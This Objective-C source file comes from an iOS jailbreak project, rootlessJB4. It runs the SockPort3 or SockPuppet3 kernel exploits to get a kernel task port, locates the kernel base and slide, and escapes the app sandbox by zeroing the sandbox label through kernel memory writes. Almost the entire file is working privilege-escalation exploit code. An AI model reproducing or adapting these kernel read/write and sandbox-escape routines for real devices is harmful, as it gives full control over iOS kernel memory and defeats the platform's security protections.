//
//  everythingElse.c
//  rootlessJB4
//
//  Created by Brandon Plank on 8/28/19.
//  Copyright © 2019 Brandon Plank. All rights reserved.
//

#import <Foundation/Foundation.h>

#import <UIKit/UIKit.h>

#include "everythingElse.h"
#include "sockport.h"
#include "offsets.h"
#include "kernel_memory.h"
#import "SockPuppet3.h"
#import "exploit.h"


#define LOG(string, args...) do {\
printf(string "\n", ##args); \
} while (0)

mach_port_t tfp0;
uint64_t kernel_slide;
uint64_t kernel_base;
uint64_t task_self_addr_cache;
uint64_t selfproc_cached;

// SockPuppet3
uint64_t task_addr_cache;

uint64_t find_kbase()
{
    uint64_t task_addr;
    switch (selectedExploit) {
        case RootlessExploitSockPort3: {
            uint64_t task_port_addr = task_self_addr_cache;
            task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
            break;
        }
        case RootlessExploitSockPuppet3:
            task_addr = task_addr_cache;
            break;
    }

    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = mach_host_self() >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
    
    uint64_t realhost = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    uint64_t base = realhost & ~0xfffULL;
    // walk down to find the magic:
    for (int i = 0; i < 0x10000; i++) {
        if (rk32(base) == 0xfeedfacf) {
            return base;
        }
        base -= 0x1000;
    }
    return 0;
}

bool runExploitSockPort3() {
    mach_port_t tmp;
    kern_return_t kRet = host_get_special_port(mach_host_self(), 0, 4, &tmp);
    if (kRet == KERN_SUCCESS && MACH_PORT_VALID(tmp)) {
        tfp0 = tmp;
        rebuild(tmp);
    } else {
        tfp0 = get_tfp0();
        if (!MACH_PORT_VALID(tfp0)) {
            goto err;
        }
    }

    kernel_base = find_kbase();
    kernel_slide = (kernel_base - 0xFFFFFFF007004000);

success:
    return true;
err:
    return false;
}

bool runExploitSockPuppet3() {

    if (![SockPuppet3 run]) {
        return false;
    }

    tfp0 = [SockPuppet3 fakeKernelTaskPort];
    init_kernel_memory(tfp0);
    task_addr_cache = [SockPuppet3 currentTaskAddress];

    uint64_t itk_space = rk64(task_addr_cache + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t task_xd = rk64(itk_space + 0x28);
    uint64_t selfproc = rk64(task_xd + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    selfproc_cached = selfproc;

    kernel_base = find_kbase();
    kernel_slide = (kernel_base - 0xFFFFFFF007004000);

    return true;
}

bool runExploit(void *init)
{
    
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    __block RootlessExploit selectedExploitByAlert = RootlessExploitSockPuppet3;
    
    dispatch_async(dispatch_get_main_queue(), ^{
        [[UIApplication sharedApplication] endIgnoringInteractionEvents];

        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"WARNING"
                                       message:@"Select Exploit?"
                                       preferredStyle:UIAlertControllerStyleAlert];

                                       UIAlertAction *socketPuppet = [UIAlertAction actionWithTitle:@"SocketPuppet" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                           [[UIApplication sharedApplication] beginIgnoringInteractionEvents];
                                           dispatch_semaphore_signal(sem);
                                       }];

                                       UIAlertAction *sockPort = [UIAlertAction actionWithTitle:@"ScokPort" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                           [[UIApplication sharedApplication] beginIgnoringInteractionEvents];
                                           selectedExploitByAlert = RootlessExploitSockPort3;
                                           dispatch_semaphore_signal(sem);
                                       }];
        
        [alert addAction:socketPuppet];
        [alert addAction:sockPort];
        
        [(__bridge UIViewController *)init presentViewController:alert animated:true completion:nil];
    });
    
    dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
    
    switch (selectedExploitByAlert) {
        case RootlessExploitSockPuppet3:
            return runExploitSockPuppet3();
        case RootlessExploitSockPort3:
            return runExploitSockPort3();
    }
}

bool escapeSandbox()
{
    // 00 00 00 00 00 | No Sandbox
    // 01 00 00 00 00 | Sandbox
    uint64_t ucred = rk64(selfproc_cached + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    uint64_t cr_label = rk64(ucred + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL));
    uint64_t sandbox_addr = cr_label + 0x8 + 0x8;
    wk64(sandbox_addr, (uint64_t) 0);
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/test_jb" contents:NULL attributes:nil];
    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/test_jb"])
    {
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/test_jb" error:nil];
        return true;
    } else {
        return false;
    }
    
}
